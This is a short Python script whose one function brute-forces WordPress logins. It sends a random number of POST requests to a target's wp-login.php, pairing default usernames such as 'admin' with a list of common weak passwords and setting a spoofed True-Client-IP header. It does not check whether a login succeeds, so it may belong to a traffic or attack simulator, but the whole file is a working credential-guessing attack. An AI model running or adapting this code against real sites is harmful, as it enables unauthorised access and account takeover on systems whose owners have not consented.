import random
import requests

# attempt to bruteforce wordpress login
def wp_login_bruteforce(target, source_ip, user_agent, **kwargs):

    #usernames and passwords to try
    usernames = [
                    'administrator',
                    'Administrator',
                    'user',
                    'user1',
                    'wordpress',
                    'admin',
                    'demo',
                    'admin',
                    'securedmz'
                ]
    passwords = [
                    'admin',
                    'demo',
                    'administrator',
                    'P@ssword',
                    'securedmz',
                    'secure',
                    '123456',
                    'passw0rd',
                    '00000',
                    '111111',
                    '123123',
                    '123321',
                    '1234',
                    '12345',
                    '1234567',
                    '12345678',
                    '123456789',
                    '1234567890',
                    '123abc',
                    '654321',
                    '666666',
                    '696969',
                    'aaaaaa',
                    'abc123',
                    'alberto',
                    'alejandra',
                    'alejandro',
                    'amanda',
                    'andrea',
                    'angel',
                    'angels',
                    'anthony',
                    'asdf',
                    'asdfasdf',
                    'ashley',
                    'babygirl',
                    'baseball',
                    'basketball',
                    'beatriz',
                    'blahblah',
                    'bubbles',
                    'buster',
                    'butterfly',
                    'zxcvbnm',
                    'zxczxc'
                ]


    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded'
              }

    count=random.randint(5,50)

    for i in range(count):

        username = random.choice(usernames)
        password = random.choice(passwords)

        attack = {
                  "method": "POST",
                  "url": "{}/wp-login.php".format(target),
                  "payload": {"log": username, "pwd": password}
                  }
        response = requests.request(attack['method'], attack['url'], headers=headers, data=attack['payload']).status_code

    return("wp_login_bruteforces: sent {} requests to {}".format(count,target))
